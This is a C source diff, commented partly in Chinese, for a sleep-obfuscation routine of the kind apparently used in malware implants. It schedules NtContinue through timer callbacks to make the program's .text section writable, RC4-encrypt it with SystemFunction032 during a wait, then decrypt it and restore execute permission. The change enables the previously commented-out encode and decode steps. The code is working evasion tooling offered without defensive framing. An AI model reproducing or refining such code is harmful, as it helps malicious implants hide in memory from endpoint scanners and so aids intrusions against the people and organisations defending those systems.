@@ -83,15 +83,15 @@ void SleepObf(uint32_t time) {
 
                 uint64_t ProtVal = 0;
                 ProtRW.Rip = API.VirtualProtect;
-                ProtRW.Rcx = ImageAddress;
-                ProtRW.Rdx = ImageSize;
+                ProtRW.Rcx = TextAddress;
+                ProtRW.Rdx = TextSize;
                 ProtRW.R8 = 0x04;  // PAGE_READWRITE
                 ProtRW.R9 = &ProtVal;
 
-                USTRING img = { ImageSize, ImageSize, ImageAddress };
+                USTRING t = { TextSize, TextSize, TextAddress };
 
                 Encode.Rip = pSystemFunction032;
-                Encode.Rcx = &img;
+                Encode.Rcx = &t;
                 Encode.Rdx = &key;
 
                 ToSleep.Rip = API.WaitForSingleObjectEx;
@@ -100,7 +100,7 @@ void SleepObf(uint32_t time) {
                 ToSleep.R8 = false;
 
                 Decode.Rip = pSystemFunction032;
-                Decode.Rcx = &img;
+                Decode.Rcx = &t;
                 Decode.Rdx = &key;
 
                 ProtRX.Rip = API.VirtualProtect;
@@ -115,9 +115,9 @@ void SleepObf(uint32_t time) {
 
                 // 使用 NtContinue 来触发各种任务
                 API.RtlCreateTimer(hTimerQueue, &hTimer[2], (WAITORTIMERCALLBACK)API.NtContinue, &ProtRW, 100, 0, 0x00000020);
-                // API.RtlCreateTimer(hTimerQueue, &hTimer[3], (WAITORTIMERCALLBACK)API.NtContinue, &Encode, 200, 0, 0x00000020);
+                API.RtlCreateTimer(hTimerQueue, &hTimer[3], (WAITORTIMERCALLBACK)API.NtContinue, &Encode, 200, 0, 0x00000020);
                 API.RtlCreateTimer(hTimerQueue, &hTimer[4], (WAITORTIMERCALLBACK)API.NtContinue, &ToSleep, 300, 0, 0x00000020);
-                // API.RtlCreateTimer(hTimerQueue, &hTimer[5], (WAITORTIMERCALLBACK)API.NtContinue, &Decode, 400, 0, 0x00000020);
+                API.RtlCreateTimer(hTimerQueue, &hTimer[5], (WAITORTIMERCALLBACK)API.NtContinue, &Decode, 400, 0, 0x00000020);
                 API.RtlCreateTimer(hTimerQueue, &hTimer[6], (WAITORTIMERCALLBACK)API.NtContinue, &ProtRX, 500, 0, 0x00000020);
                 API.RtlCreateTimer(hTimerQueue, &hTimer[7], (WAITORTIMERCALLBACK)API.NtContinue, &Awaking, 600, 0, 0x00000020);
 
